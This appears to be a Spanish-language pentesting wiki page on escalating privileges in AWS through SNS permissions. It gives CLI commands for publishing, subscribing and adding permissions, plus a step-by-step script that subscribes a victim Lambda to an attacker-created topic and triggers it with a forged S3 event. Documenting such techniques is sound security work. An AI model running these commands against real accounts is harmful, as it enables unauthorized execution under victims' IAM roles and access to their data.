# AWS - SNS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## SNS

Para más información consulta:

{{#ref}}
../../aws-services/aws-sns-enum.md
{{#endref}}

### `sns:Publish`

Un atacante podría enviar mensajes maliciosos o no deseados al SNS topic, potencialmente provocando corrupción de datos, activando acciones no intencionadas o agotando recursos.
```bash
aws sns publish --topic-arn <value> --message <value>
```
**Impacto potencial**: Explotación de vulnerabilidades, corrupción de datos, acciones no intencionadas o agotamiento de recursos.

### `sns:Subscribe`

Un atacante podría suscribirse a un topic de SNS, potencialmente obteniendo acceso no autorizado a los mensajes o interrumpiendo el funcionamiento normal de las aplicaciones que dependen del topic.
```bash
aws sns subscribe --topic-arn <value> --protocol <value> --endpoint <value>
```
**Potential Impact**: Acceso no autorizado a mensajes (información sensible), interrupción del servicio para aplicaciones que dependen del topic afectado.

### `sns:AddPermission`

Un atacante podría otorgar a usuarios o servicios no autorizados acceso a un SNS topic, obteniendo potencialmente permisos adicionales.
```bash
aws sns add-permission --topic-arn <value> --label <value> --aws-account-id <value> --action-name <value>
```
**Impacto potencial**: Acceso no autorizado al topic, exposición de mensajes o manipulación del topic por usuarios o servicios no autorizados, interrupción del funcionamiento normal de aplicaciones que dependen del topic.


### Invocar una Lambda abusando de permisos comodín de SNS (sin `SourceArn`)

Si la política basada en recursos de una función Lambda permite que `sns.amazonaws.com` la invoque sin restringir el topic origen (`SourceArn`), cualquier topic de SNS (incluso en otra cuenta) puede suscribirse y activar la función. Un atacante con permisos básicos de SNS puede forzar a la Lambda a ejecutarse bajo su IAM role con entrada controlada por el atacante.

> [!TIP]
> TODO: ¿Esto realmente se puede hacer entre cuentas?

Precondiciones
- La política de la Lambda víctima contiene una declaración como la siguiente, SIN la condición `SourceArn`:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {"Service": "sns.amazonaws.com"},
"Action": "lambda:InvokeFunction"
// No Condition/SourceArn restriction here
}
]
}
```
Pasos de abuso (misma cuenta o entre cuentas)
```bash
# 1) Create a topic you control
ATTACKER_TOPIC_ARN=$(aws sns create-topic --name attacker-coerce --region us-east-1 --query TopicArn --output text)

# 2) Subscribe the victim Lambda to your topic
aws sns subscribe \
--region us-east-1 \
--topic-arn "$ATTACKER_TOPIC_ARN" \
--protocol lambda \
--notification-endpoint arn:aws:lambda:us-east-1:<victim_acct_id>:function:<VictimFunctionName>

# 3) Publish an attacker-controlled message to trigger the Lambda
aws sns publish \
--region us-east-1 \
--topic-arn "$ATTACKER_TOPIC_ARN" \
--message '{"Records":[{"eventSource":"aws:s3","eventName":"ObjectCreated:Put","s3":{"bucket":{"name":"attacker-bkt"},"object":{"key":"payload.bin"}}}]}'
```
**Impacto potencial**: La Lambda víctima se ejecuta con su rol IAM, procesando entrada controlada por el atacante. Esto puede ser abusado para que la función realice acciones sensibles (p. ej., escribir en S3, acceder a secretos, modificar recursos) dependiendo de sus permisos.


{{#include ../../../../banners/hacktricks-training.md}}
